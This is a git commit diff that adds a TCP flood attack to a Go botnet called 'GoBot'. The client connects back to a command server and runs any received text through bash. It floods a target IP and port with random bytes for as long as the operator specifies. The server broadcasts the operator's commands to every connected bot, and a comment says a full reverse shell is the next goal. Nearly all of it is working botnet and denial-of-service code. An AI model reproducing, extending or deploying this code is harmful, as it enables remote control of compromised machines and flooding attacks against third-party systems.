be2b36e3987be59b0ca2f3736bb7562bdc6c065c
Cracop <rodrigoalejandrobarrera@gmail.com>
2023-08-17 11:25:42 -0600

    added tcp attack and commented the code

--- client/client.go
+++ client/client.go
@@ -1,18 +1,23 @@
 package main
 
 import (
+	"crypto/rand"
 	"fmt"
 	"net"
 	"os/exec"
+	"strconv"
+	"strings"
 	"time"
 )
 
 func main() {
+	//Connect to the server
 	serverAddr := "127.0.0.1:8080"
 	var conn net.Conn
 
 	for {
-		if conn == nil {
+		if conn == nil { //This makes sure to reconnect if the connection falls
+			//tries to connect
 			newConn, err := net.Dial("tcp", serverAddr)
 			if err != nil {
 				fmt.Println("Error connecting to the server:", err)
@@ -36,13 +41,27 @@ func main() {
 					}
 
 					receivedData := string(buffer[:n])
-					fmt.Println("Received from server:\n", receivedData)
-					output, err := executeCommand(receivedData)
-					if err != nil {
-						fmt.Println("Error executing command:", err)
-						continue
+					parameters := strings.Split(receivedData, " ")
+
+					//parameters = [type,ip, port, secs, size]
+					switch parameters[0] {
+					case "tcp":
+						fmt.Println(parameters)
+						secs, _ := strconv.ParseUint(parameters[3], 10, 64)
+						size, _ := strconv.ParseUint(parameters[4], 10, 64)
+						tcp_attack(parameters[1], parameters[2], secs, size)
+
+					default:
+						fmt.Println("Received from server:", receivedData)
+						output, err := executeCommand(receivedData)
+
+						if err != nil {
+							fmt.Println("Error executing command:", err)
+							continue
+						}
+						fmt.Println("Command executed:\n", output)
 					}
-					fmt.Println("Command executed:\n", output)
+
 				}
 			}()
 		}
@@ -52,6 +71,8 @@ func main() {
 	}
 }
 
+// Executes in the cmd the message sent vy the server
+// Not reverseShell but we are getting there
 func executeCommand(code string) (string, error) {
 	cmd := exec.Command("bash", "-c", code)
 
@@ -61,4 +82,42 @@ func executeCommand(code string) (string, error) {
 	}
 
 	return string(output), nil
+}
+
+func tcp_attack(ip string, port string, secs uint64, size uint64) {
+	defer fmt.Printf("Attack on %v done\n", ip)
+	duration := time.Duration(secs) * time.Second // Set the desired duration (e.g., 5 seconds)
+	startTime := time.Now()                       // Get the current time
+	serverAddr := ip + ":" + port
+	fmt.Printf(serverAddr)
+
+	// Run a loop for the specified duration
+	for time.Since(startTime) < duration {
+		conn, err := net.Dial("tcp", serverAddr)
+		if err != nil {
+			fmt.Println("Error:", err)
+			return
+		}
+		defer conn.Close()
+
+		for time.Since(startTime) < duration {
+
+			//Send random data bytes to the target
+			randomData := make([]byte, size)
+			_, err := rand.Read(randomData)
+
+			if err != nil {
+				fmt.Println("Error generating random data:", err)
+				return
+			}
+			//fmt.Println(randomData)
+			//Writes the message as a byte slice to the server connection using the conn.Write method. The underscore (_) is used to ignore the number of bytes written (since it's not used).
+			_, err = conn.Write([]byte(randomData))
+			if err != nil {
+				fmt.Println("Error sending data:", err)
+				return
+			}
+		}
+	}
+
 }
--- server/server.go
+++ server/server.go
@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strings"
 	"sync"
 )
 
@@ -14,20 +15,26 @@ var (
 	broadcast  = make(chan string)       // Channel for broadcasting messages
 )
 
+// Function that handles when a client connects
 func handleConnection(conn net.Conn, broadcast chan<- string) {
-	defer conn.Close()
+	defer conn.Close() //When the function ends in closes the connection
 
+	//Makes a transaction
 	clientsMux.Lock()
 	clients[conn] = true
 	clientsMux.Unlock()
 
+	//Buffer between client and server
 	buffer := make([]byte, 1024)
 
+	//Just to know which client connected
 	clientAddr := conn.RemoteAddr().String()
 	fmt.Printf("Client connected: %s\n", clientAddr)
 
 	for {
-		n, err := conn.Read(buffer)
+		//Check if its connected
+		_, err := conn.Read(buffer)
+		//If there is an error that means that the client disconnected
 		if err != nil {
 			clientsMux.Lock()
 			delete(clients, conn)
@@ -35,63 +42,72 @@ func handleConnection(conn net.Conn, broadcast chan<- string) {
 			fmt.Printf("Client disconnected: %s\n", clientAddr)
 			return
 		}
-		data := buffer[:n]
-		fmt.Printf("Received: %s", data)
 
-		broadcast <- string(data)
+		//data := buffer[:n]
+		//fmt.Printf("Received: %s", data)
+
+		//broadcast <- string(data)
 	}
 }
 
+// Send message to all connected clients
 func broadcastMessages() {
 	for {
-		message := <-broadcast
-		clientsMux.Lock()
+		message := <-broadcast //Receives the message to send to the clients
+		clientsMux.Lock()      //Makes sure no one modifies the client list while its working
 		for client := range clients {
-			_, err := client.Write([]byte(message))
+			_, err := client.Write([]byte(message)) //Sends message to clients
 			if err != nil {
 				fmt.Println("Error broadcasting data:", err)
 			}
 		}
-		clientsMux.Unlock()
+		clientsMux.Unlock() //Finishes the transaction
 	}
 }
 
 func main() {
+
 	port := "8080"
-	listener, err := net.Listen("tcp", ":"+port)
-	if err != nil {
+	listener, err := net.Listen("tcp", ":"+port) //Starts listening in port
+
+	if err != nil { //If error exits
 		fmt.Println("Error:", err)
 		os.Exit(1)
 	}
-	defer listener.Close()
+	defer listener.Close() //Males sure to close the port when the function ends
 
 	fmt.Println("Server listening on port", port)
 
-	go broadcastMessages()
+	go broadcastMessages() //Starts subrutine that sends the message to the clients
 
-	go func() {
+	go func() { //Anonymous function that captures the commands written in cmd
 		for {
 			fmt.Print("GoBot> ")
 			reader := bufio.NewReader(os.Stdin)
 			command, _ := reader.ReadString('\n')
+			command = strings.TrimRight(command, "\n")
 
 			switch command {
-			case "exit\n":
+			case "exit":
 				fmt.Println("Exiting server.")
 				close(broadcast)
 				os.Exit(0)
 
-			case "?\n", "help\n":
-				fmt.Println("	command 1")
+			case "attacks":
+				fmt.Println("	tcp ip port secs bytes")
+
+			case "?", "help":
+				fmt.Println("	attacks: shows all the possible attacks")
 				fmt.Println("	command 2")
 				fmt.Println("	command 3")
 				fmt.Println("	command 4")
 
-			case "show\n":
+			case "show":
 				fmt.Printf("Number of connected clients: %v\n", int(len(clients)))
 
 			default:
-				broadcast <- command
+				broadcast <- command //Takes the command and sends in to the channel
+				//so that its broadcasted to the clients
 			}
 		}
 	}()
@@ -106,14 +122,3 @@ func main() {
 		go handleConnection(conn, broadcast) // Handle the connection concurrently in a goroutine
 	}
 }
-
-/* switch dayOfWeek {
-case "Monday":
-	// Do something
-case "Tuesday":
-	// Do something else
-// ... and so on
-default:
-	// Default case
-}
-*/
